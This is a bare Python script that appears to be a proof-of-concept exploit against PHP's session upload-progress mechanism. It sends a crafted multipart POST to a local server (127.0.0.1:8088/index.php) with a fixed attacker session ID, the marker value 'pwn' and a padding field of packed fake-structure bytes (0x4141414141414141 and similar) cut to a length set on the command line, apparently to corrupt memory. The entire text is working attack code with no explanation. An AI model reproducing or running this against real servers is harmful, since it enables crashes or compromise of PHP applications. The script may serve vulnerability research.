#!/usr/bin/env python3
import os, socket, struct, sys
HOST='127.0.0.1'; PORT=8088; PATH='/index.php'; SID='attacksessionid0001'
L=int(sys.argv[1]) if len(sys.argv)>1 else 31
pat=(struct.pack('<IIQIIQ',1,10,0x4141414141414141,0x307,0,0)*4)[:L]
def mp(parts,b):
    o=bytearray()
    for p in parts:
        o+=b'--'+b+b'\r\nContent-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'+p['data']+b'\r\n'
    o+=b'--'+b+b'--\r\n'; return bytes(o)
b=mp([{'name':'PHPSESSID','data':SID.encode()},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'},{'name':'pad','data':pat}],b'BNDRY12345')
h=(f'POST {PATH} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nContent-Type: multipart/form-data; boundary=BNDRY12345\r\nContent-Length: {len(b)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection((HOST,PORT),timeout=10); s.settimeout(10)
try: s.sendall(h+b)
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
